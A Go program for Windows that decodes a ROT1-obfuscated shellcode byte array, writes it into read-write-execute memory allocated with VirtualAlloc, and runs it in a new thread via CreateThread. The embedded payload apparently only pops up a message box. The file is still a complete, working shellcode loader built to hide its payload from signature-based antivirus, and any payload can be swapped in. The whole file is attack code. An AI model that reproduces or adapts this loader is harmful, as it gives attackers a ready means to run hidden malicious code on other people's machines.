package main

import (
	"fmt"
	"golang.org/x/sys/windows"
	"syscall"
	"unsafe"
)

func rot1Decrypt(input []byte) []byte {
	// Reverse ROT1 transformation for all ASCII characters
	decrypted := make([]byte, len(input))
	for i, b := range input {
		decrypted[i] = byte(b - 1) // Decrypt each byte
	}
	return decrypted
}

func main() {
// ROT1 encoded shellcode result of rot1.go
	rot1Sc := []byte{0xFD, 0x49, 0x82, 0xE5, 0xF1, 0x0, 0x0, 0x0, 0xE9, 0xD1, 0x1, 0x1, 0x1, 0x42, 0x52, 0x42, 0x51, 0x53, 0x52, 0x57, 0x49, 0x32, 0xD3, 0x66, 0x49, 0x8C, 0x53, 0x61, 0x3F, 0x49, 0x8C, 0x53, 0x19, 0x3F, 0x49, 0x8C, 0x53, 0x21, 0x3F, 0x49, 0x8C, 0x73, 0x51, 0x3F, 0x49, 0x10, 0xB8, 0x4B, 0x4B, 0x4E, 0x32, 0xCA, 0x49, 0x32, 0xC1, 0xAD, 0x3D, 0x62, 0x7D, 0x3, 0x2D, 0x21, 0x42, 0xC2, 0xCA, 0xE, 0x42, 0x2, 0xC2, 0xE3, 0xEE, 0x53, 0x42, 0x52, 0x3F, 0x49, 0x8C, 0x53, 0x21, 0x3F, 0x8C, 0x43, 0x3D, 0x49, 0x2, 0xD1, 0x3F, 0x8C, 0x81, 0x89, 0x1, 0x1, 0x1, 0x49, 0x86, 0xC1, 0x75, 0x70, 0x49, 0x2, 0xD1, 0x51, 0x3F, 0x8C, 0x49, 0x19, 0x3F, 0x45, 0x8C, 0x41, 0x21, 0x4A, 0x2, 0xD1, 0xE4, 0x5D, 0x49, 0x0, 0xCA, 0x3F, 0x42, 0x8C, 0x35, 0x89, 0x49, 0x2, 0xD7, 0x4E, 0x32, 0xCA, 0x49, 0x32, 0xC1, 0xAD, 0x42, 0xC2, 0xCA, 0xE, 0x42, 0x2, 0xC2, 0x39, 0xE1, 0x76, 0xF2, 0x3F, 0x4D, 0x4, 0x4D, 0x25, 0x9, 0x46, 0x3A, 0xD2, 0x76, 0xD7, 0x59, 0x3F, 0x45, 0x8C, 0x41, 0x25, 0x4A, 0x2, 0xD1, 0x67, 0x3F, 0x42, 0x8C, 0xD, 0x49, 0x3F, 0x45, 0x8C, 0x41, 0x1D, 0x4A, 0x2, 0xD1, 0x3F, 0x42, 0x8C, 0x5, 0x89, 0x49, 0x2, 0xD1, 0x42, 0x59, 0x42, 0x59, 0x5F, 0x5A, 0x5B, 0x42, 0x59, 0x42, 0x5A, 0x42, 0x5B, 0x49, 0x84, 0xED, 0x21, 0x42, 0x53, 0x0, 0xE1, 0x59, 0x42, 0x5A, 0x5B, 0x3F, 0x49, 0x8C, 0x13, 0xEA, 0x4A, 0x0, 0x0, 0x0, 0x5E, 0x3F, 0x49, 0x8E, 0x8E, 0x28, 0x2, 0x1, 0x1, 0x42, 0xBB, 0x4D, 0x78, 0x27, 0x8, 0x0, 0xD6, 0x4A, 0xC8, 0xC2, 0x1, 0x1, 0x1, 0x1, 0x3F, 0x49, 0x8E, 0x96, 0xF, 0x2, 0x1, 0x1, 0x3F, 0x4D, 0x8E, 0x86, 0x1D, 0x2, 0x1, 0x1, 0x49, 0x32, 0xCA, 0x42, 0xBB, 0x46, 0x84, 0x57, 0x8, 0x0, 0xD6, 0x49, 0x32, 0xCA, 0x42, 0xBB, 0xF1, 0xB6, 0xA3, 0x57, 0x0, 0xD6, 0x74, 0x69, 0x66, 0x6D, 0x6D, 0x64, 0x70, 0x65, 0x66, 0x21, 0x73, 0x76, 0x6F, 0x1, 0x4E, 0x66, 0x74, 0x74, 0x62, 0x68, 0x66, 0x43, 0x70, 0x79, 0x1, 0x76, 0x74, 0x66, 0x73, 0x34, 0x33, 0x2F, 0x65, 0x6D, 0x6D, 0x1, 0x1, 0x69, 0x42, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x0, 0x0, 0x0, 0x0, 0x81, 0x42, 0x1, 0x1, 0x1, 0x31, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x8F, 0x42, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x9F, 0x42, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x4C, 0x46, 0x53, 0x4F, 0x46, 0x4D, 0x34, 0x33, 0x2F, 0x65, 0x6D, 0x6D, 0x1, 0x1, 0x59, 0x5, 0x57, 0x6A, 0x73, 0x75, 0x76, 0x62, 0x6D, 0x42, 0x6D, 0x6D, 0x70, 0x64, 0x1, 0x1, 0x6, 0x2, 0x46, 0x79, 0x6A, 0x75, 0x51, 0x73, 0x70, 0x64, 0x66, 0x74, 0x74, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x9, 0x1, 0x1, 0x1,}
	shellcode := rot1Decrypt(rot1Sc)
	decryptedShellcode := rot1Decrypt(rot1Sc)
	fmt.Println("Decrypted Shellcode:")
	for _, b := range decryptedShellcode {
    	fmt.Printf("0x%X ", b)
	}	

	// Windows API functions
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	virtualAlloc := kernel32.NewProc("VirtualAlloc")
	rtlMoveMemory := kernel32.NewProc("RtlMoveMemory")
	createThread := kernel32.NewProc("CreateThread")
	waitForSingleObject := kernel32.NewProc("WaitForSingleObject")

	// Allocate memory (using VirtualAlloc) - executable, writable, and readable memory
	addr, _, err := virtualAlloc.Call(
		0, 
		uintptr(len(shellcode)), 
		windows.MEM_COMMIT|windows.MEM_RESERVE, 
		windows.PAGE_EXECUTE_READWRITE,
	)
	if addr == 0 {
		fmt.Printf("VirtualAlloc failed: %v\n", err)
		return
	}
	fmt.Printf("Memory allocated at: %v\n", addr)

	// Copy the shellcode into the allocated memory
	_, _, err = rtlMoveMemory.Call(addr, uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	if err != syscall.Errno(0) {
		fmt.Printf("RtlMoveMemory failed: %v\n", err)
		return
	}

	// Create a new thread to execute the shellcode
	threadHandle, _, err := createThread.Call(
		0, 0, addr, 0, 0, 0, 
	)
	if threadHandle == 0 {
		fmt.Printf("CreateThread failed: %v\n", err)
		return
	}
	fmt.Printf("Shellcode thread created successfully with handle: %v\n", threadHandle)
	for _, b := range shellcode {
		fmt.Printf("0x%X ", b)
	}

	// Wait for the shellcode thread to finish
	ret, _, err := waitForSingleObject.Call(threadHandle, 0xFFFFFFFF)
	if ret == 0xFFFFFFFF {
		fmt.Printf("WaitForSingleObject failed: %v\n", err)
		return
	}


	fmt.Println("Shellcode executed and thread completed successfully.")
}
